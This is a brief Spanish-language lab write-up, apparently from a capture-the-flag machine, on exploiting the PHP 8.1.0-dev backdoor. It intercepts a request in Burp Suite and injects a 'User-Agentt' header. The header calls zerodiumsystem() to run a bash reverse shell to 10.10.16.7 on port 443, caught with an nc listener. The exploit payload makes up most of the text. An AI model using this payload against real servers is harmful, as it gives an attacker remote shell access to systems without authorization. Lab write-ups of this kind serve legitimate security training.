#php810-dev 

# Intrusion Vulnerabilidad php 8.1-dev

Interceptamos la peticion con [[burpsuite]]

![[Knife4.png]]
Ahora vamos a añadir la linea que es vulnerable de User-Agentt: y le vamos a inyectar el one liner que casi siempre usamos para la [[Reverse shell]] 
```
User-Agentt: zerodiumsystem('bash -c "bash -i >& /dev/tcp/10.10.16.7/443 0>&1"');
```

Ahora mientras estamos en escucha con [[nc -nlvp 443]], mandamos la peticion
![[Knife5.png]]

Y listo ya estamos adentro de la maquina
![[Knife6.png]]
